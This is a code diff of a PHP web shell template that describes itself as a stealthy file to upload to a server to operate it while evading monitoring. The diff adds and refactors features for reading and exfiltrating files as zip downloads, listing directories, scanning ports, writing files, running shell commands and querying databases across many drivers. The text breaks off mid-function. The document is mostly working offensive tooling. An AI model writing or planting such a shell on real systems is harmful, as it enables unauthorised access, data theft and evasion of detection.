@@ -4,7 +4,7 @@
  * Build: 2024-04-13
  * Last change: 2024-04-13
  * Author: @Ebalo <https://github.com/ebalo55>
- * Minimum PHP version: 5.3
+ * Minimum PHP version: 5.5
  * Description:
  * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
  * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
@@ -12,21 +12,24 @@
  * monitoring system without rising any uncommon process tree nor disk operation.
  * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
  */
+//error_reporting(0);
 session_start();
 
 // Features name constants
-define("LOGIN", "__FEAT_LOGIN__");
-define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
-define("FILE_EXTRACTION_PREVIEW", "__FEAT_FILE_EXTRACTION_PREVIEW__");
-define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
-define("EXFILTRATE", "__FEAT_EXFILTRATE__");
-define("PORT_SCAN", "__FEAT_PORT_SCAN__");
-define("WRITE_FILE", "__FEAT_WRITE_FILE__");
-define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");
+$LOGIN                   = "__FEAT_LOGIN__";
+$FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
+$FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
+$DIRECTORY_LISTING       = "__FEAT_DIRECTORY_LISTING__";
+$EXFILTRATE              = "__FEAT_EXFILTRATE__";
+$PORT_SCAN               = "__FEAT_PORT_SCAN__";
+$WRITE_FILE              = "__FEAT_WRITE_FILE__";
+$RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
+$PHP_INFO                = "__FEAT_PHP_INFO__";
+$QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
 
-define("USERNAME", "__USERNAME__");
-define("PASSWORD", "__PASSWORD__");
-define("SALT", "__SALT__");
+$USERNAME = "__USERNAME__";
+$PASSWORD = "__PASSWORD__";
+$SALT     = "__SALT__";
 
 /**
  * Define the enabled features
@@ -34,14 +37,14 @@ define("SALT", "__SALT__");
  * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
  */
 $ENABLED_FEATURES = array(
-    FILE_EXTRACTION         => array(
+    $FILE_EXTRACTION         => array(
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    FILE_EXTRACTION_PREVIEW => array(
+    $FILE_EXTRACTION_PREVIEW => array(
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
@@ -49,39 +52,53 @@ $ENABLED_FEATURES = array(
 </svg>',
         "hidden"      => true,
     ),
-    DIRECTORY_LISTING       => array(
+    $DIRECTORY_LISTING       => array(
         "title"       => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
     ),
-    EXFILTRATE              => array(
+    $EXFILTRATE              => array(
         "title"       => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
     ),
-    PORT_SCAN               => array(
+    $PORT_SCAN               => array(
         "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
     ),
-    WRITE_FILE              => array(
+    $WRITE_FILE              => array(
         "title"       => "Write file",
         "description" => "Write a file to the given path, writing permission are required.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    RUN_COMMAND             => array(
+    $RUN_COMMAND             => array(
         "title"       => "Run command",
         "description" => "Run a system command using the default shell.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
+</svg>',
+    ),
+    $PHP_INFO                => array(
+        "title"       => "PHP Info",
+        "description" => "Display PHP information.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
+</svg>',
+    ),
+    $QUERY_DATABASES         => array(
+        "title"       => "Query databases",
+        "description" => "Query databases using the provided credentials.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
 </svg>',
     ),
 );
@@ -93,6 +110,13 @@ $CSS = '__CSS__';
 ////////////////////////
 /// UTILITY FUNCTIONS //
 ////////////////////////
+
+// Fix for PHP < 5.5
+if (!function_exists("array_column")) {
+    function array_column($array, $column_name) {
+        return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
+    }
+}
 
 /**
  * Check if the request method is POST
@@ -215,7 +239,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     ob_start();
     if ($type !== "textarea") {
         ?>
-        <div class="flex flex-col gap-y-2">
+        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -245,7 +269,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     }
     else {
         ?>
-        <div class="flex flex-col gap-y-2">
+        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -275,6 +299,57 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
 }
 
 /**
+ * Create a select field
+ *
+ * @param $label string Label for the select
+ * @param $name string Name of the select
+ * @param $options array<{label: string, value: string, disabled?: bool, selected?: bool}> Options for the select
+ * @param $required bool Whether the select is required
+ * @param $disable_reason string|null Reason for the option to be disabled, if any
+ *
+ * @return string
+ */
+function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
+    ob_start();
+    ?>
+    <div id="<?php echo $name ?>-container">
+        <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-gray-900">
+            <?php echo $label ?>
+            <?php
+            if ($required) {
+                echo "<sup class='text-red-500'>*</sup>";
+            }
+            ?>
+        </label>
+        <select id="<?php echo $name ?>" name="<?php echo $name ?>"
+                class="mt-2 block w-full rounded-md border-0 py-1.5 pl-3 pr-10 text-gray-900 ring-1 ring-inset
+                ring-gray-300 focus:ring-2 focus:ring-indigo-600 sm:text-sm sm:leading-6"
+            <?php
+            if ($required) {
+                echo "required ";
+            }
+            ?>
+        >
+            <?php
+            foreach ($options as $option) {
+                echo "<option value='" .
+                     $option["value"] .
+                     "' " .
+                     ($option["disabled"] ? "disabled" : "") .
+                     ($option["selected"] ? "selected" : "") .
+                     ">" .
+                     $option["label"] .
+                     ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
+                     "</option>";
+            }
+            ?>
+        </select>
+    </div>
+    <?php
+    return ob_get_clean();
+}
+
+/**
  * Create a checkbox field
  *
  * @param $name string Name of the checkbox
@@ -289,7 +364,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
 function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
     ob_start();
     ?>
-    <div class="relative flex items-start">
+    <div class="relative flex items-start" id="<?php echo $name ?>-container">
         <div class="flex h-6 items-center">
             <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                    class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
@@ -356,9 +431,9 @@ function makeForm($operation, $action, $elements, $method = "post") {
  * @return string
  */
 function makePage($elements, $current_page) {
-    global $ENABLED_FEATURES, $CSS;
+    global $ENABLED_FEATURES, $CSS, $LOGIN;
     if ($_SESSION["auth"] !== true) {
-        header("Location: ?page=" . LOGIN);
+        header("Location: ?page=" . $LOGIN);
         die();
     }
 
@@ -368,6 +443,7 @@ function makePage($elements, $current_page) {
     <head>
         <title>__TITLE__</title>
         <style><?php echo $CSS ?></style>
+        <link rel="stylesheet" href="compiled.css">
         <script>__JS__</script>
     </head>
     <body class="bg-white">
@@ -412,13 +488,14 @@ function makePage($elements, $current_page) {
  * @return string
  */
 function makeLoginPage() {
-    global $CSS;
+    global $CSS, $LOGIN;
     ob_start();
     ?>
     <html lang="en" class="h-full bg-zinc-900">
     <head>
         <title>__TITLE__</title>
         <style><?php echo $CSS ?></style>
+        <link rel="stylesheet" href="compiled.css">
         <script>__JS__</script>
     </head>
     <body class="h-full">
@@ -431,7 +508,7 @@ function makeLoginPage() {
 
         <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
             <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
-                <input type="hidden" name="__OPERATION__" value="<?php echo LOGIN ?>"/>
+                <input type="hidden" name="__OPERATION__" value="<?php echo $LOGIN ?>"/>
                 <div>
                     <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
                         Username
@@ -529,18 +606,23 @@ function makeAlert($title, $message) {
 /**
  * Open the command output screen where output can be freely written
  *
+ * @param string $title Title of the command output screen
+ *
  * @return void
  */
-function openCommandOutputScreen()
+function openCommandOutputScreen($classes = "", $title = "Command output", $no_margin = false, $no_padding = false)
 {
     ?>
-<div class="ml-72 py-10">
+<div class="<?php
+echo $no_margin ? "" : "ml-72 ";
+echo $no_padding ? "" : "py-10 ";
+?>">
     <div class="container px-16">
-    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-2">
-    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-7">
-        Command output
+    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
+    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
+        <?php echo $title ?>
     </h3>
-    <pre class="p-2"><?php
+    <pre class="p-2 mt-2 <?php echo $classes ?>"><?php
 }
 
 /**
@@ -576,6 +658,37 @@ function out($data) {
 ///////////////////////
 
 /**
+ * Download a file in chunks
+ *
+ * @param $filepath string Path to the file to download
+ * @param $filesize int Size of the file
+ * @param $filename string Name of the file to download or null to use the original filename
+ *
+ * @return void
+ */
+function chunkedDownload($filepath, $filesize, $filename = null) {
+    $chunk_size = 4096; // Adjust chunk size as needed
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream'); // Adjust content type if needed
+    header(
+        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"'
+    );
+    header('Content-Transfer-Encoding: chunked');
+    header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
+
+    $file_handle = fopen($filepath, 'rb');
+
+    while (!feof($file_handle)) {
+        $chunk = fread($file_handle, $chunk_size);
+        echo $chunk;
+        flush();     // Flush output buffer after sending each chunk
+    }
+
+    fclose($file_handle);
+}
+
+/**
  * Handle the file extraction operation
  *
  * @return void
@@ -592,26 +705,6 @@ function handleFileExtraction() {
 
     $filesize = filesize($filepath);
 
-    $export_callback = function () use ($filepath, $filesize) {
-        $chunk_size = 4096; // Adjust chunk size as needed
-
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream'); // Adjust content type if needed
-        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
-        header('Content-Transfer-Encoding: chunked');
-        header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
-
-        $file_handle = fopen($filepath, 'rb');
-
-        while (!feof($file_handle)) {
-            $chunk = fread($file_handle, $chunk_size);
-            echo $chunk;
-            flush();     // Flush output buffer after sending each chunk
-        }
-
-        fclose($file_handle);
-    };
-
     echo "Reading file '$filepath'\n";
     echo "File size: " . formatBytes($filesize) . "\n";
     if ($preview) {
@@ -624,10 +717,10 @@ function handleFileExtraction() {
     }
 
     if ($filesize < 102400) { // Less than 100Kb
-        $export_callback();
+        chunkedDownload($filepath, $filesize);
     }
     elseif ($export) {
-        $export_callback();
+        chunkedDownload($filepath, $filesize);
     }
 }
 
@@ -659,21 +752,7 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
     }
 
     // Get stat for current path
-    $stat = stat($path);
-
-    // Print information for current path
-    $perm = getPermissionsString($path);
-    echo "$perm " .
-         pad_right("" . $stat["nlink"], 3) .
-         " " .
-         pad_right("" . $stat["uid"], 5) .
-         " " .
-         pad_right("" . $stat["gid"], 5) .
-         " " .
-         formatBytes($stat["size"]) .
-         " " .
-         convertUnixTimestampToDate($stat["mtime"]) .
-         " $path\n";
+    getStatForCurrentPath($path);
 
     if ($show_line_split) {
         echo "----------------\n";
@@ -694,25 +773,40 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
                 }
                 else {
                     // Print information for files beyond max depth
-                    $stat = stat($sub_path);
-                    $perm = getPermissionsString($sub_path);
-                    echo "$perm " .
-                         pad_right("" . $stat["nlink"], 3) .
-                         " " .
-                         pad_right("" . $stat["uid"], 5) .
-                         " " .
-                         pad_right("" . $stat["gid"], 5) .
-                         " " .
-                         formatBytes($stat["size"]) .
-                         " " .
-                         convertUnixTimestampToDate($stat["mtime"]) .
-                         " $sub_path\n";
+                    getStatForCurrentPath($sub_path);
                 }
             }
         }
         // Close directory handle
         closedir($dir_handle);
     }
+}
+
+/**
+ * Get the stat for the current path and print information
+ *
+ * @param $path string Path to get stat for
+ *
+ * @return array
+ */
+function getStatForCurrentPath($path) {
+    $stat = stat($path);
+
+    // Print information for current path
+    $perm = getPermissionsString($path);
+    echo "$perm " .
+         pad_right("" . $stat["nlink"], 3) .
+         " " .
+         pad_right("" . $stat["uid"], 5) .
+         " " .
+         pad_right("" . $stat["gid"], 5) .
+         " " .
+         formatBytes($stat["size"]) .
+         " " .
+         convertUnixTimestampToDate($stat["mtime"]) .
+         " $path\n";
+
+    return array($stat, $perm);
 }
 
 /**
@@ -770,11 +864,8 @@ function pad_right($str, $pad_length = 10) {
         return $str; // Return unmodified string for invalid input
     }
 
-    // Calculate the number of spaces needed for padding
-    $padding = max(0, $pad_length - strlen($str));
-
     // Pad the string with spaces using str_pad
-    return str_pad($str, $pad_length, ' ', STR_PAD_RIGHT);
+    return str_pad($str, $pad_length);
 }
 
 /**
@@ -852,11 +943,22 @@ function getShortestCommonPath($paths) {
 function handleCreateZip() {
     $content = $_POST['__PARAM_1__'];
 
+    if (!extension_loaded('zip')) {
+        echo makeExfiltratePage();
+        openCommandOutputScreen();
+        echo "Error: Zip extension is not loaded.\n";
+        closeCommandOutputScreen();
+        return;
+    }
+
     $zip      = new ZipArchive();
     $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
 
     if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
-        echo "Error: Could not create temporary archive.";
+        echo makeExfiltratePage();
+        openCommandOutputScreen();
+        echo "Error: Could not create temporary archive.\n";
+        closeCommandOutputScreen();
         return;
     }
 
@@ -904,24 +1006,8 @@ function handleCreateZip() {
 
     $zip->close();
 
-    $file_size  = filesize($zip_name);
-    $chunk_size = 4096; // Adjust chunk size as needed
-
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream'); // Adjust content type if needed
-    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
-    header('Content-Transfer-Encoding: chunked');
-    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking
-
-    $file_handle = fopen($zip_name, 'rb');
-
-    while (!feof($file_handle)) {
-        $chunk = fread($file_handle, $chunk_size);
-        echo $chunk; // Add CRLF after each chunk
-        flush();     // Flush output buffer after sending each chunk
-    }
-
-    fclose($file_handle);
+    $file_size = filesize($zip_name);
+    chunkedDownload($zip_name, $file_size, "export.zip");
     unlink($zip_name); // Delete temporary zip file;
 }
 
@@ -1025,15 +1111,893 @@ function handleWriteFile() {
 
 /**
  * Handle the login operation
+ *
  * @return void
  */
 function handleLogin() {
-    $username = hash("sha512", $_POST["__PARAM_1__"] . SALT);
-    $password = hash("sha512", $_POST["__PARAM_2__"] . SALT);
+    global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
+    $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
+    $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);
 
-    if ($username === USERNAME && $password === PASSWORD) {
+    if ($username === $USERNAME && $password === $PASSWORD) {
         $_SESSION["auth"] = true;
-        header("Location: ?page=" . FILE_EXTRACTION, true, 301);
+        header("Location: ?page=" . $FILE_EXTRACTION, true, 301);
+    }
+}
+
+/**
+ * Render the page for the exfiltration operation
+ *
+ * @return string
+ */
+function makeExfiltratePage() {
+    global $EXFILTRATE, $ENABLED_FEATURES;
+    return makePage(
+        array(
+            makePageHeader(
+                $ENABLED_FEATURES[$EXFILTRATE]["title"],
+                $ENABLED_FEATURES[$EXFILTRATE]["description"]
+            ),
+            makeForm(
+                $EXFILTRATE,
+                $_SERVER["REQUEST_URI"],
+                array(
+                    makeInput(
+                        "textarea",
+                        "Paths",
+                        "__PARAM_1__",
+                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
+                        "List of file/folders to include in the zip archive.<br/>" .
+                        "Concatenate to the path " . makeCodeHighlight(",with_tree") .
+                        " to include all files and folders within a given directory.<br/>" .
+                        "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
+                        " to include only files with the given extensions.",
+                        true
+                    ),
+                )
+            ),
+        ),
+        $EXFILTRATE
+    );
+}
+
+/**
+ * List all enabled extensions
+ *
+ * @return string
+ */
+function listEnabledExtensions() {
+    $extensions = get_loaded_extensions();
+    ob_start();
+    openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
+    foreach ($extensions as $extension) {
+        echo "- $extension\n";
+    }
+    closeCommandOutputScreen();
+    return ob_get_clean();
+}
+
+/**
+ * Run a PDO query and output the results
+ *
+ * @param $pdo PDO PDO connection to use
+ * @param $query string Query to run
+ *
+ * @return void
+ */
+function runPDOQuery($pdo, $query) {
+    $stmt = $pdo->query($query);
+    if ($stmt) {
+        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        if ($result) {
+            echo "[Driver: PDO] Query executed successfully.\n";
+            printAsciiTable($result);
+        }
+        else {
+            echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
+        }
+    }
+    else {
+        echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
+    }
+}
+
+/**
+ * Print an ASCII table from the given data
+ *
+ * @param $data
+ *
+ * @return void
+ */
+function printAsciiTable($data) {
+    // Get column headers
+    $headers = array_keys($data[0]);
+
+    // Calculate column widths
+    $columnWidths = array();
+    foreach ($headers as $header) {
+        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+    }
+
+    // Print top row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+
+    // Print header row
+    echo "|";
+    foreach ($headers as $header) {
+        printf("%-{$columnWidths[$header]}s|", $header);
+    }
+    echo PHP_EOL;
+
+    // Print divider row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+
+    // Print table rows
+    foreach ($data as $row) {
+        echo "|";
+        foreach ($row as $key => $value) {
+            printf("%-{$columnWidths[$key]}s|", $value);
+        }
+        echo PHP_EOL;
+    }
+
+    // Print bottom row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+}
+
+/**
+ * Connect to a database using the given credentials and return the connection
+ *
+ * @param $db_type string Database type
+ * @param $username string Username to connect with
+ * @param $password string Password to connect with
+ * @param $host string Host to connect to
+ * @param $port int Port to connect to
+ * @param $service_name string Service name to use for connection
+ * @param $sid string SID to use for connection
+ * @param $database string Database to connect to
+ * @param $charset string Charset to use for connection
+ * @param $options string Options to use for connection
+ * @param $role string Role to use for connection
+ * @param $dialect string Dialect to use for connection
+ * @param $odbc_driver string ODBC driver to use for connection
+ * @param $server string Informix server name
+ * @param $protocol string Protocol to use for connection
+ * @param $enableScrollableCursors string Whether to enable scrollable cursors
+ * @param $raw_connection_string string Raw connection string to use for connection
+ *
+ * @return void
+ */
+function connectAndQueryDatabase(
+    $db_type,
+    $username,
+    $password,
+    $host = 'localhost',
+    $port = null,
+    $service_name = null,
+    $sid = null,
+    $database = null,
+    $charset = null,
+    $options = null,
+    $role = null,
+    $dialect = null,
+    $odbc_driver = null,
+    $server = null,
+    $protocol = "onsoctcp",
+    $enableScrollableCursors = null,
+    $raw_connection_string = "",
+    $query = null,
+    $collection = null
+) {
+    if ($db_type === 'mysql') {
+        $port = $port ?: 3306;
+
+        // Check if the MySQL extension is loaded
+        if (extension_loaded("mysql")) {
+            $connection = mysql_connect("$host:$port", $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: mysql] Connection failed: " . mysql_error();
+            }
+            else {
+                echo "[Driver: mysql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = mysql_query($query, $connection);
+                    echo "[Driver: mysql] Query executed successfully.\n";
+                    if ($result) {
+                        $rows = array();
+                        while ($row = mysql_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: mysql] Query failed: " . mysql_error();
+                    }
+                }
+            }
+        }
+        // Check if the MySQLi extension is loaded
+        elseif (extension_loaded("mysqli")) {
+            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+            try {
+                $connection = mysqli_connect($host, $username, $password, $database, $port);
+
+                if (!$connection) {
+                    echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
+                }
+                else {
+                    echo "[Driver: mysqli] Connected successfully using $username:$password.\n";
+
+                    if (!empty($query)) {
+                        $result = mysqli_query($connection, $query);
+                        if ($result) {
+                            echo "[Driver: mysqli] Query executed successfully.\n";
+                            $rows = array();
+                            while ($row = mysqli_fetch_assoc($result)) {
+                                $rows[] = $row;
+                            }
+                            printAsciiTable($rows);
+                        }
+                        else {
+                            echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
+                        }
+                    }
+                }
+            }
+            catch (mysqli_sql_exception $e) {
+                echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the PDO MySQL extension is loaded
+        elseif (extension_loaded("pdo_mysql")) {
+            try {
+                $dsn = "mysql:host=$host;port=$port" .
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
+        elseif (extension_loaded("pdo")) {
+            echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
+        }
+        else {
+            echo "[Driver: none] MySQL extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'cubrid') {
+        $port = $port ?: 30000;
+
+        // Check if the CUBRID PDO extension is loaded
+        if (extension_loaded("pdo_cubrid")) {
+            try {
+                $dsn = "cubrid:host=$host;port=$port" .
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the CUBRID extension is loaded
+        elseif (extension_loaded("cubrid")) {
+            $connection = cubrid_connect($host, $port, $database, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
+            }
+            else {
+                echo "[Driver: cubrid] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = cubrid_query($query, $connection);
+                    if ($result) {
+                        echo "[Driver: cubrid] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = cubrid_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] CUBRID extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'pgsql') {
+        $port = $port ?: 5432;
+
+        // Check if the PostgreSQL PDO extension is loaded
+        if (extension_loaded("pdo_pgsql")) {
+            try {
+                $dsn = "pgsql:host=$host;port=$port" . (!empty($database) ? ";dbname=$database" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the PostgreSQL extension is loaded
+        elseif (extension_loaded("pgsql")) {
+            $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");
+
+            if (!$connection) {
+                echo "[Driver: pgsql] Connection failed: " . pg_last_error();
+            }
+            else {
+                echo "[Driver: pgsql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = pg_query($connection, $query);
+                    if ($result) {
+                        echo "[Driver: pgsql] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = pg_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] PostgreSQL extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'sqlite') {
+        // Check if the SQLite PDO extension is loaded
+        if (extension_loaded("pdo_sqlite")) {
